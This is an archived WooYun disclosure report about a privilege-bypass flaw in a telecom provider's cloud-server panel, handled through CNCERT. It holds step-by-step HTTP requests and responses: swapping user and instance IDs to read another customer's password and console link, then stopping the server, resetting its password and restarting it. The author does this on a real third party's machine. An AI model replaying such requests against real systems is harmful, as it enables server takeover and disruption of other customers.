{"id": 71939, "wybug_id": "wooyun-2015-0150098", "wybug_title": "北京电信通（时代宏远）云主机面板存在越权漏洞可导致越权控制大量服务器权限", "wybug_corp": "电信通", "wybug_author": "glzjin", "wybug_date": "2015-10-28 15:12", "wybug_open_date": "2015-12-13 17:22", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-13：\t细节向公众公开  简要描述： 看到这个标题是不是很熟悉呢？ 详细说明：  是的，先看到这里http://**.**.**.**/bugs/wooyun-2015-098853在我今天早上发现了漏洞之后，就去网上搜索了一下，没想到还真的有过。不过，既然已经公开了，那么应该已经修复了吧？然而，我测试过程中，发现，还是没有，下面我就结合我的发现，来报告一下这个漏洞。首先，是进入到这个管理面板。http://**.**.**.**/index.asp然后登陆，开始抓包。\n\n在登陆之后，可以看到抓到这样一个包，我们从这里入手\nPOST **.**.**.**:7001/drpengcloudportal/pr/client?p=/instance/describeInstances HTTP/1.1Host: **.**.**.**:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: **.**.**.**:7001/drpengcloudportal/newui/jsp/workspace.jspContent-Length: 56Cookie: JSESSIONID=A05*******************Connection: keep-alivePragma: no-cacheCache-Control: no-cachetype=1&state=&name=&beginDate=&endDate=&ownUserId=******\n这个，最后面的 ownUserId 大有玄机，我们随机改改试试\nPOST **.**.**.**:7001/drpengcloudportal/pr/client?p=/instance/describeInstances HTTP/1.1Host: **.**.**.**:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: **.**.**.**:7001/drpengcloudportal/newui/jsp/workspace.jspContent-Length: 56Cookie: JSESSIONID=A05F8D414F3***********Connection: keep-alivePragma: no-cacheCache-Control: no-cachetype=1&state=&name=&beginDate=&endDate=&ownUserId=418600\n然后我们看看返回了什么吧\n{\"data\":[{\"state\":\"running\",\"msg\":null,\"config\":{\"monitorSate\":null,\"memorySize\":512,\"cpuNum\":1},\"instanceName\":\"i-2-22462-VM\",\"nicsNum\":1,\"bizType\":1,\"optState\":\"\",\"templateType\":1,\"expireDate\":1448171004000,\"instanceId\":434522,\"productCode\":\"XYI-win2003_32_N1\",\"productName\":\"国内云主机MⅡ-win2003-32-N1\",\"appName\":null,\"appDesc\":null,\"createDate\":1445007880000,\"saleDate\":1445491672000,\"instanceType\":1,\"resourcePoolId\":\"12f499f0-1861-4384-93b4-37fd18efdada\"}],\"code\":\"0\",\"msg\":\"success\"}\n哈哈就得到这个账户的信息了。然后我们这里需要的是 instanceId 这个参数 可以看到我们目标攻击的主机是 434522，记下。然后我们继续看，先到自己的主机里，查看密码，抓到一个格式，作为模板。\nPOST **.**.**.**:7001/drpengcloudportal/pr/client?p=/instance/vm/searchPassword/****** HTTP/1.1Host: **.**.**.**:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1X-Requested-With: XMLHttpRequestReferer: **.**.**.**:7001/drpengcloudportal/newui/jsp/workspaceConsole.jspCookie: JSESSIONID=A05F8D4************Connection: keep-alivePragma: no-cacheCache-Control: no-cacheContent-Length: 0\n把 URL 里的地址 替换成 上面获取的实例ID，比如 刚刚的，\nPOST **.**.**.**:7001/drpengcloudportal/pr/client?p=/instance/vm/searchPassword/434522 HTTP/1.1Host: **.**.**.**:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1X-Requested-With: XMLHttpRequestReferer: **.**.**.**:7001/drpengcloudportal/newui/jsp/workspaceConsole.jspCookie: JSESSIONID=A05F8D41*******Connection: keep-alivePragma: no-cacheCache-Control: no-cacheContent-Length: 0\n然后就可以看到了\nHTTP/1.1 200 OKServer: Apache-Coyote/1.1Content-Type: text/json;charset=utf-8Transfer-Encoding: chunkedDate: Wed, 28 Oct 2015 05:47:08 GMT2f{\"data\":\"sC9fwrpzk\",\"code\":\"0\",\"msg\":\"success\"}0\n然后继续来，获取一下远程桌面的连接地址吧。同样的，点击自己的主机，抓个模板。\nPOST **.**.**.**:7001/drpengcloudportal/api HTTP/1.1Host: **.**.**.**:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: **.**.**.**:7001/drpengcloudportal/newui/jsp/workspaceConsole.jspContent-Length: 70Cookie: JSESSIONID=A05F8D414F3B************Connection: keep-alivePragma: no-cacheCache-Control: no-cachecommand=getVirtualMachineVncContent&reponseType=json&instanceId=******\n如法炮制，获取我们目标主机的 URL。\nPOST **.**.**.**:7001/drpengcloudportal/api HTTP/1.1Host: **.**.**.**:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: **.**.**.**:7001/drpengcloudportal/newui/jsp/workspaceConsole.jspContent-Length: 70Cookie: JSESSIONID=A05F8D414F3B************Connection: keep-alivePragma: no-cacheCache-Control: no-cachecommand=getVirtualMachineVncContent&reponseType=json&instanceId=434522\n获取到了~\nHTTP/1.1 200 OKServer: Apache-Coyote/1.1Content-Type: text/javascript;charset=UTF-8Content-Length: 331Date: Wed, 28 Oct 2015 05:53:13 GMT{\"html\":\"http:\\/\\/**.**.**.**\\/ajax?token=AjxGnsjX3lLTBSNVbxlIgomzZ6vFg44Z6ISHRrccoXJHOxgNiM7u8NI1bmcP_OT2Uw38McVMk51y_-0DMk09FE7dWam1ojWD7v1IN9-BlNXz7-k9Z80mbO81dHb-My_scv_tAzJNPRTwT0gI5KgWNl2tIQwVjgrLFyWl7E_-WslM2hgI56rYO-oPXqbWJJmm5hTQmmlVX-lJTTSOIBLfcnlCGsZKmYN1qIGKbT5b-JXfDaRfFuCMIZJlnppEufsM&guest=windows&title=i-2-22462-VM\"}\n我们访问看看~http://**.**.**.**/ajax?token=AjxGnsjX3lLTBSNVbxlIgomzZ6vFg44Z6ISHRrccoXJHOxgNiM7u8NI1bmcP_OT2Uw38McVMk51y_-0DMk09FE7dWam1ojWD7v1IN9-BlNXz7-k9Z80mbO81dHb-My_scv_tAzJNPRTwT0gI5KgWNl2tIQwVjgrLFyWl7E_-WslM2hgI56rYO-oPXqbWJJmm5hTQmmlVX-lJTTSOIBLfcnlCGsZKmYN1qIGKbT5b-JXfDaRfFuCMIZJlnppEufsM&guest=windows&title=i-2-22462-VM看到没，登陆了。\n\n我用刚才得到的密码 sC9fwrpzk 试试。\n\n似乎是修改了默认密码不要紧，我们可以重置在自己的面板上，先关机，然后尝试重置密码，这里我抓模板。这个是关机的\nPOST **.**.**.**:7001/drpengcloudportal/pr/client?p=/instance/vm/stopInstances/****** HTTP/1.1Host: **.**.**.**:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1X-Requested-With: XMLHttpRequestReferer: **.**.**.**:7001/drpengcloudportal/newui/jsp/workspaceConsole.jspCookie: JSESSIONID=A05F8D*********Connection: keep-alivePragma: no-cacheCache-Control: no-cacheContent-Length: 0\n这个是重置密码的\nPOST **.**.**.**:7001/drpengcloudportal/pr/client?p=/instance/vm/resetPassword HTTP/1.1Host: **.**.**.**:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: **.**.**.**:7001/drpengcloudportal/newui/jsp/workspaceConsole.jspContent-Length: 28Cookie: JSESSIONID=*****************Connection: keep-alivePragma: no-cacheCache-Control: no-cacheids=******&newOsPwd=testhack\n然后这个是开机指令。\nPOST **.**.**.**:7001/drpengcloudportal/pr/client?p=/instance/vm/startInstances/****** HTTP/1.1Host: **.**.**.**:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1X-Requested-With: XMLHttpRequestReferer: **.**.**.**:7001/drpengcloudportal/newui/jsp/workspaceConsole.jspCookie: JSESSIONID=A05F8D*********Connection: keep-alivePragma: no-cacheCache-Control: no-cacheContent-Length: 0\nOK ,我们来试试发送停机指令\nPOST **.**.**.**:7001/drpengcloudportal/pr/client?p=/instance/vm/stopInstances/434522 HTTP/1.1Host: **.**.**.**:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1X-Requested-With: XMLHttpRequestReferer: **.**.**.**:7001/drpengcloudportal/newui/jsp/workspaceConsole.jspCookie: JSESSIONID=A05F8D414F**********Connection: keep-alivePragma: no-cacheCache-Control: no-cacheContent-Length: 0\n\n\n然后继续\nPOST **.**.**.**:7001/drpengcloudportal/pr/client?p=/instance/vm/resetPassword HTTP/1.1Host: **.**.**.**:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: **.**.**.**:7001/drpengcloudportal/newui/jsp/workspaceConsole.jspContent-Length: 28Cookie: JSESSIONID=A05F8D414F*********Connection: keep-alivePragma: no-cacheCache-Control: no-cacheids=434522&newOsPwd=testhack\n重置密码了然后启动看看\nPOST **.**.**.**:7001/drpengcloudportal/pr/client?p=/instance/vm/startInstances/434522 HTTP/1.1Host: **.**.**.**:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1X-Requested-With: XMLHttpRequestReferer: **.**.**.**:7001/drpengcloudportal/newui/jsp/workspaceConsole.jspCookie: JSESSIONID=**********Connection: keep-alivePragma: no-cacheCache-Control: no-cacheContent-Length: 0\n看看能登陆没= =\nPOST **.**.**.**:7001/drpengcloudportal/api HTTP/1.1Host: **.**.**.**:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: **.**.**.**:7001/drpengcloudportal/newui/jsp/workspaceConsole.jspContent-Length: 70Cookie: JSESSIONID=*****************Connection: keep-alivePragma: no-cacheCache-Control: no-cachecommand=getVirtualMachineVncContent&reponseType=json&instanceId=434522\n\nHTTP/1.1 200 OKServer: Apache-Coyote/1.1Content-Type: text/javascript;charset=UTF-8Content-Length: 331Date: Wed, 28 Oct 2015 06:38:06 GMT{\"html\":\"http:\\/\\/**.**.**.**\\/ajax?token=AjxGnsjX3lLTBSNVbxlIgomzZ6vFg44Z6ISHRrccoXJHOxgNiM7u8NI1bmcP_OT2hKQKK_Co0p1y_-0DMk09FE7dWam1ojWD7v1IN9-BlNXz7-k9Z80mbO81dHb-My_scv_tAzJNPRTwT0gI5KgWNl2tIQwVjgrLFyWl7E_-WslM2hgI56rYO-oPXqbWJJmm5hTQmmlVX-kvWZef6ESo25qF7mRQUFT8L46G0pqyAjG_mI4pwlMGLpBsBD40gtIw&guest=windows&title=i-2-22462-VM\"}\n然后，接着看下面的验证。   漏洞证明：  \n\nLInux 的我就不演示了，异曲同工要是我写个小脚本来批量重装系统= =不晓得有什么后果呢。   修复方案：  加强验证   版权声明：转载请注明来源 glzjin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-10-29 17:21 厂商回复： CNVD确认所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-28 17:27 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:543 漏洞数:61        | 没有我，你们就去背IP吧)\t\t \n  1    \n     2015-10-29 23:59 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1077 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  好熟悉的标题    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}